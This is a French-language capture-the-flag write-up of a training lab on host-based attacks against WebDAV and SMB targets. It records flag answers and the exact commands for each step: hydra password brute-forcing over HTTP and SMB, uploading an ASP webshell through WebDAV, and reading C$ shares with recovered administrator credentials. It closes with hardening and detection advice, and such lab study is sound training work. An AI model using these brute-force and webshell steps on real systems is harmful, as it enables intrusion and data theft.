# Host & Network Penetration Testing: System-Host Based Attacks CTF 1

## Vue d'ensemble du CTF
Ce CTF couvre les attaques basées sur les systèmes hôtes avec **4 flags** répartis sur **2 cibles** :
- **target1.ine.local** (Flags 1 & 2) - Exploitation WebDAV
- **target2.ine.local** (Flags 3 & 4) - Exploitation SMB

---

## 🎯 FLAG 1: Attaque par Brute-force HTTP

### **Question:** *"User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located."*

#### **Démarche:**
1. **Reconnaissance initiale**
   ```bash
   nmap -sC -sV target1.ine.local
   ```
   - Port 80 ouvert avec authentification HTTP (401 Unauthorized)

2. **Brute-force des credentials**
   ```bash
   hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /
   ```
   - Découverte: `bob:password_123321`

3. **Exploration des répertoires**
   ```bash
   dirb http://target1.ine.local -u bob:password_123321
   ```
   - Découverte du répertoire `/webdav`

4. **Récupération du flag**
   - Navigation vers `http://target1.ine.local/webdav`
   - **Flag 1:** `4ccc8664b99f44158dd3e42c46ae39eb`

---

## 🎯 FLAG 2: Upload de Webshell WebDAV

### **Question:** *"Valuable files are often on the C: drive. Explore it thoroughly."*

#### **Démarche:**
1. **Test des capacités WebDAV**
   ```bash
   davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
   ```
   - Extensions supportées: .asp, .txt, .shtml, .html

2. **Upload du webshell**
   ```bash
   cadaver http://target1.ine.local/webdav
   # Credentials: bob:password_123321
   put /usr/share/webshells/asp/webshell.asp
   ```

3. **Exécution de commandes**
   - Accès: `http://target1.ine.local/webdav/webshell.asp`
   - Commande: `dir C:\`

4. **Récupération du flag**
   - Commande: `type C:\flag2.txt`
   - **Flag 2:** `f4369f68b4c049dd8ffe0d2f545ddb2f`

---

## 🎯 FLAG 3: Brute-force SMB

### **Question:** *"By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag."*

#### **Démarche:**
1. **Reconnaissance SMB**
   ```bash
   nmap -sC -sV target2.ine.local
   ```
   - Port 445 SMB ouvert

2. **Énumération (échec)**
   ```bash
   enum4linux -a target2.ine.local
   ```
   - Accès refusé

3. **Brute-force SMB**
   ```bash
   hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
         -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
         smb://target2.ine.local
   ```
   - Credentials découverts: `administrator:pineapple`

4. **Énumération des shares**
   ```bash
   crackmapexec smb target2.ine.local -u administrator -p pineapple --shares
   ```
   - Shares avec permissions R/W: `ADMIN$` et `C$`

5. **Accès au share C$**
   ```bash
   smbclient //target2.ine.local/C$ -U administrator
   # Password: pineapple
   dir
   get flag3.txt
   ```
   - **Flag 3:** `79b87a8ef8724d9997c774aadaf360a4`

---

## 🎯 FLAG 4: Exploration du Bureau Administrateur

### **Question:** *"The Desktop directory might have what you're looking for. Enumerate its contents."*

#### **Démarche:**
1. **Navigation vers le Desktop**
   ```bash
   # Dans la session SMB existante
   cd Users\Administrator\Desktop\
   dir
   ```

2. **Récupération du flag**
   ```bash
   get flag4.txt
   cat flag4.txt
   ```
   - **Flag 4:** `b3fa315c074d4fa2b7706b22aea22f78`

---

## 📋 Résumé des Techniques Utilisées

### **Attaques par Brute-force**
- **HTTP Basic Auth** - Hydra avec wordlist unix_passwords.txt
- **SMB Authentication** - Hydra avec wordlists users + passwords
- **Importance des wordlists** - Utilisation de listes Metasploit intégrées

### **Exploitation WebDAV**
- **Test des capacités** - davtest pour identifier les extensions
- **Upload de webshell** - cadaver pour transfer de fichiers
- **Exécution de commandes** - webshell ASP sur IIS

### **Exploitation SMB**
- **Énumération des shares** - crackmapexec pour permissions
- **Accès aux partages** - smbclient pour navigation
- **Extraction de données** - get/put pour transfert de fichiers

### **Reconnaissance**
- **Nmap** - Identification des services et versions
- **Directory brute-force** - dirb pour découverte de contenu
- **Service enumeration** - enum4linux (quand autorisé)

---

## 🔧 Outils Clés

| Outil | Usage | Commande Type |
|-------|-------|---------------|
| `nmap` | Reconnaissance | `-sC -sV target` |
| `hydra` | Brute-force | `-l user -P wordlist http-get` |
| `dirb` | Directory fuzzing | `dirb target -u user:pass` |
| `davtest` | Test WebDAV | `-auth user:pass -url target/webdav` |
| `cadaver` | Client WebDAV | Upload de fichiers |
| `smbclient` | Client SMB | Accès aux shares |
| `crackmapexec` | Énumération SMB | `--shares` pour permissions |

---

## 💡 Points Clés à Retenir

### **Méthodologie d'Attaque**
1. **Reconnaissance** systématique (nmap)
2. **Identification des services** vulnérables
3. **Brute-force ciblé** avec wordlists adaptées
4. **Escalade progressive** (accès → exploration → exploitation)

### **Vulnérabilités Exploitées**
- **Mots de passe faibles** sur services critiques
- **WebDAV mal configuré** permettant upload de fichiers
- **Partages SMB** avec permissions excessives
- **Authentification basique** sans protection anti-brute-force

### **Techniques de Persistence**
- **Webshells** pour accès command & control
- **Sessions SMB** pour exploration de fichiers
- **Extraction systématique** de données sensibles

---

## ⚠️ Mesures de Sécurisation

### **Prévention des Attaques**
- **Politiques de mots de passe** robustes
- **Limitation des tentatives** de connexion
- **Désactivation des services** non nécessaires (WebDAV)
- **Restriction des permissions** SMB au minimum requis
- **Monitoring des accès** et des tentatives de brute-force

### **Détection**
- **Logs d'authentification** multiples échecs
- **Activité WebDAV** inhabituelle
- **Accès SMB** depuis des sources non autorisées
- **Upload de fichiers** suspects (.asp, .php)

Ce CTF illustre l'importance d'une configuration sécurisée des services de base et des politiques de mots de passe robustes dans un environnement Windows/IIS.